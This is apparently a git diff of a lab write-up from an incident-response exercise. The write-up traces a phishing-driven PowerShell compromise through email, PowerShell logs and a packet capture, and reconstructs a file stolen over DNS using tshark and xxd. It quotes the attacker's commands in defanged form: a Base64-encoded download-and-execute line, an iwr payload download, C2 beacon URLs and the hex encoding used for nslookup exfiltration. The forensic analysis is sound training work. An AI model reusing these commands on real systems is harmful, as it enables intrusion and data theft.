@@ -10,21 +10,21 @@ The security team was able to flag the suspicious execution of the attachment, i
 
 We are given the following artefacts:
 
-- Copy of the phishing email (`dump[.]eml`)
-- Powershell Logs from Julianne's workstation (`powershell[.]json`)
-- Packet capture from the same workstation (`capture[.]pcapng`)
+- Copy of the phishing email (`dump.eml`)
+- Powershell Logs from Julianne's workstation (`powershell.json`)
+- Packet capture from the same workstation (`capture.pcapng`)
 
 ## Investigation
 
 ### Email Analysis
 
-We are able to extract various information from the provided [dump[.]eml](./dump[.]eml) file, such as sender and victim email address, name of the file inside the encrypted attachment and more. We also have a Base64 encoded payload:
+We are able to extract findings from the provided [dump.eml](./dump.eml) file, such as sender and victim email address, name of the file inside the encrypted attachment and more. We also have a Base64 encoded payload:
 
 ```text
 aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
 ```
 
-Using [Cyberchef](hxxps[://]gchq[.]github[.]io/CyberChef/), we are able to decrypt the payload and see the malicious command:
+Using [Cyberchef](https://gchq.github.io/CyberChef/), we are able to decrypt the payload and see the malicious command:
 
 ```bash
 iex (new-object net[.]webclient).downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update')
@@ -69,18 +69,16 @@ ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockTex
 
 **Note:** I have defanged the output for safety/security
 
-We can see that the domains `files[.]bpakcaging[.]xyz` and `github[.]com` were used to download files, and `cdn[.]bpakcaging[.]xyz` was used for C2. 
+The attacker sends an initial beacon to `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/8cce49b0` for C2, and then continously checks in with `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/b86459bb` to retrieve attacker commands. It then executes the retrieved commands, and send the results back to `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/27fe2489`.
 
-The attacker sends an initial beacon to `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/8cce49b0`, and then continously checks in with `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/b86459bb` to retrieve attacker commands. It then executes the retrieved commands, and send the results back to `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/27fe2489`.
-
-The attacker downloaded a `seatbelt[.]exe` file, `sb[.]exe` and `sq3[.]exe`. Although the domain `files[.]bpakcaging[.]xyz` does not exist, I researched that `seatbelt[.]exe` is a C# tool used for enumeration and information gathering. We can confirm the execution of `seatbelt[.]exe`:
+The attacker downloaded a `seatbelt.exe` file, `sb.exe` and `sq3.exe`. Although the domain `files[.]bpakcaging[.]xyz` does not exist, I researched that `seatbelt.exe` is a C# tool used for enumeration and information gathering. We can confirm the execution of `seatbelt.exe`:
 
 ```bash
 ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep seatbelt[.]exe -i
   "ScriptBlockText": "Seatbelt[.]exe -group=user;pwd"
 ```
 
-We can also see the use of the `sb[.]exe` file, which also seems to be a sort of enumeration tool:
+We can also see the use of the `sb.exe` file, which also seems to be a sort of enumeration tool:
 
 ```bash
 ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep sb[.]exe   
@@ -92,7 +90,7 @@ ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockTex
   "ScriptBlockText": ".\\sb[.]exe -group=user;pwd"
 ```
 
-Now lets see if a file was accessed by the `sq3[.]exe` binary:
+Now lets see if a file was accessed by the `sq3.exe` binary:
 
 ```bash
 ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep sq3[.]exe -i     
@@ -101,7 +99,7 @@ ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockTex
   "ScriptBlockText": "iwr hxxp[://]files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe;pwd"
 ```
 
-It looks like `plum[.]sqlite` was accessed by the binary file.
+It looks like `plum.sqlite` was accessed by the binary file.
 
 ### Data exfiltration
 
@@ -123,13 +121,13 @@ We get some interesting output. It seems like the intruder has exfiltrated the `
 $hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd
 ```
 
-The intruder then used `nslookup`, which performs DNS queries, to exfiltrate the hex encoded data as a subdomain of the `bpakcaging[.]xyz` domain. 
+The intruder then used `nslookup`, which performs DNS queries, to exfiltrate the hex encoded data as a subdomain of the `bpakcaging[.]xyz` domain.
 
 ### Network Analysis
 
 Now that we know the attacker was able to exfiltrate two files to `bpakcaging[.]xyz`, we can look at the packet capture using Wireshark.
 
-Since we were able to see the IP and host name of the file hosting server (`167[.]71[.]211[.]113`, `files[.]bpakcaging[.]xyz`) that the attacker used, we can prepare a filter in Wireshark to see the server's `http` responses:
+Since we were able to see the IP and host name of the file hosting server that the attacker used, we can prepare a filter in Wireshark to see the server's `http` responses:
 
 <img width="1917" height="630" alt="Screenshot 2025-09-12 220533" src="https://github.com/user-attachments/assets/525e80a9-a08f-4eac-84b5-f60bf0263577" />
 
@@ -139,13 +137,15 @@ Additionally, we can also view the requests and responses to the C2 server with 
 
 <img width="1908" height="906" alt="Screenshot 2025-09-12 222346" src="https://github.com/user-attachments/assets/f25c8de7-c0b4-42b3-9a2b-9c04b1547b1e" />
 
-Decoding the encoded data in the body of the `POST` request using [Cyberchef](hxxps[://]gchq[.]github[.]io/CyberChef/), we can see the the attacker is sending the output of the commands being run on the victim machine back to the malicious server.
+Decoding the encoded data in the body of the `POST` request using [Cyberchef](https://gchq.github.io/CyberChef/), we can see the the attacker is sending the output of the commands being run on the victim machine back to the malicious server.
 
 Now lets look at the `protected_data.kdbx` exfiltrated file. We know that the attacker used `nslookup`, a tool used for making DNS requests, to exfiltrate the file to the `bpakcaging[.]xyz` domain, and the attacker has explicitly set the DNS server to server these requests with an IP of `167[.]71[.]211[.]113`. Therefore, we can set the Wireshark filter appropriately and we get the following results:
 
 <img width="1917" height="858" alt="Screenshot 2025-09-13 132405" src="https://github.com/user-attachments/assets/db00df84-d590-4188-a797-4cdf79a35dea" />
 
-Recall that the subdomain contained hex encoded data of the exfiltrated file. If we want to reconstruct the data, using Wireshark will not be too helpful for us since we would need to decode the all the subdomains back to its original form. Lets switch over to TShark for the added CLI ability to extract and format the relevant data. 
+### File reconstruction
+
+Recall that the subdomain contained hex encoded data of the exfiltrated file. If we want to reconstruct the data, using Wireshark will not be too helpful for us since we would need to decode all the subdomains back to its original form. Lets switch over to TShark for the added CLI ability to extract and format the relevant data.
 
 We can then run the following command using TShark:
 
@@ -168,13 +168,13 @@ With the above command, we get the data we want but we also get a lot of clutter
 tshark -r capture.pcapng -Y 'ip.dst == 167.71.211.113 and dns and dns.qry.name contains "bpakcaging.xyz"' -T fields -e dns.qry.name | cut -d '.' -f1 | uniq | tr -d '\n' > protected_data_hex
 ```
 
-What we did with this command is apply the same filter as we did in Wireshark, display just the query names, clean the output up so that we have just the hex encoded data on a single line, and save it to a file. We can now finally convert this file back to its original form like so:
+What we did with this command is apply the same filter as we did in Wireshark, display just the query names, clean the output, and save it to a file. We can now finally convert this file back to its original form like so:
 
 ```bash
 cat protected_data_hex | xxd -r -p > protected_data.kdbx
 ```
 
-Where `xxd` is a tool used to convert hexadecimal representation to ASCII. 
+Where `xxd` is a tool used to convert hexadecimal representation to ASCII.
 
 When we now try to open our reconstructed `protected_data.kdbx` file, we are asked for a password - but where do we find that? Perhaps it could be stored in the database file (`plum.sqlite`) that the attacker accessed using `sq3.exe`? Looking at the timestamp of `2023-01-13 17:25:38.759011Z` of when the file was accessed, lets check for Wireshark logs during the C2 connection around the same time to see if we can spot the password.
 
@@ -185,5 +185,7 @@ Looking at the log immediately after the above timestamp, we were able to decode
 <img width="981" height="617" alt="Screenshot 2025-09-13 141435" src="https://github.com/user-attachments/assets/fe8f2c16-bacd-437d-8b13-f8c8cfa6275f" />
 
 ---
----
 
+## Lessons Learned
+
+- 
